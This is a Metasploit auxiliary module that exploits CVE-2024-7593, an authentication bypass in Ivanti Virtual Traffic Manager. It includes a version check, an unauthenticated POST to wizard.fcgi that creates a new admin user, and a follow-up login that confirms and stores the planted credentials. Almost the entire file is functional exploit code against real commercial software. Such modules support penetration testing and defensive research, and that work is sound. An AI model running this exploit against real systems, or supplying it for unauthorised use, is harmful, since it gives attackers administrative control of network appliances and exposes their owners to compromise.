class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ivanti Virtual Traffic Manager Authentication Bypass (CVE-2024-7593)',
        'Description' => %q{
          This module exploits an access control issue in Ivanti Virtual Traffic Manager (vTM), by adding a new
          administrative user to the web interface of the application.

          Affected versions include 22.7R1, 22.6R1, 22.5R1, 22.3R2, 22.3, 22.2.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'ohnoisploited', # PoC
          'mxalias' # Credited in the vendor advisory for the discovery, https://hackerone.com/mxalias?type=user
        ],
        'References' => [
          ['PACKETSTORM', '179906'],
          ['CVE', '2024-7593'],
          ['URL', 'https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Virtual-Traffic-Manager-vTM-CVE-2024-7593?language=en_US']
        ],
        'DisclosureDate' => '2024-08-05',
        'DefaultOptions' => {
          'RPORT' => 9090,
          'SSL' => true
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username.gsub(/[^a-zA-Z0-9_-]/, '_')]),
      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(12)]),
    ])
  end

  def check
    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'apps', 'zxtm', 'login.cgi')
      }
    )

    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?

    body = res.body
    version_regex = /StingrayVersion\.Set\(\s*'([^']+)'\s*,/
    match = body.match(version_regex)
    if match
      version = match[1]
      return Exploit::CheckCode::Appears("Version: #{version}") if Rex::Version.new(version) <= Rex::Version.new('22.7R1')
    else
      return Exploit::CheckCode::Safe
    end

    Exploit::CheckCode::Safe
  end

  def run
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'apps/zxtm/wizard.fcgi?error=1&section=Access+Management%3ALocalUsers'),
      'vars_post' => {
        '_form_submitted' => 'form',
        'create_user' => 'Create',
        'group' => 'admin',
        'newusername' => datastore['NEW_USERNAME'],
        'password1' => datastore['NEW_PASSWORD'],
        'password2' => datastore['NEW_PASSWORD']
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    html = res.get_html_document
    title_tag = html.at_css('title')

    fail_with(Failure::UnexpectedReply, 'title tag not found.') unless title_tag
    title_text = title_tag.text.strip
    if title_text == '2'
      print_status('Request to add new admin user sent, verifying...')

      form = Rex::MIME::Message.new
      form.add_part('form', nil, nil, 'form-data; name="_form_submitted"')
      form.add_part(datastore['NEW_USERNAME'], nil, nil, 'form-data; name="form_username"')
      form.add_part(datastore['NEW_PASSWORD'], nil, nil, 'form-data; name="form_password"')
      form.add_part('Login', nil, nil, 'form-data; name="form_submit"')

      res = send_request_cgi(
        {
          'method' => 'POST',
          'uri' => normalize_uri(target_uri.path, 'apps', 'zxtm', 'login.cgi'),
          'ctype' => "multipart/form-data; boundary=#{form.bound}",
          'data' => form.to_s
        }
      )
      if res && res.code == 302 && res.get_cookies.include?('ZeusTMZAUTH_')
        store_valid_credential(user: datastore['NEW_USERNAME'], private: datastore['NEW_PASSWORD'], proof: html)
        print_good("New admin user was successfully added:\n\t#{datastore['NEW_USERNAME']}:#{datastore['NEW_PASSWORD']}")
        print_good("Login at: #{full_uri(normalize_uri(target_uri, 'apps/zxtm/login.cgi'))}")
      end

    elsif title_text == '0' && html.to_s.include?('ERROR: Specified user already exists')
      fail_with(Failure::BadConfig, "Specified user already exists. Specify a different user name with 'set NEW_USERNAME <USER>'.")
    elsif title_text == '0' && html.to_s.include?('ERROR: Username must contain only: letters, numbers,')
      fail_with(Failure::BadConfig, "Specified username is invalid. Username must contain only letters, numbers, underscores (_), and hyphens (-). Specify a different user name with 'set NEW_USERNAME <USER>'.")
    else
      fail_with(Failure::NotVulnerable, 'Unexpected string found inside the title tag: ' + title_text)
    end
  end
end
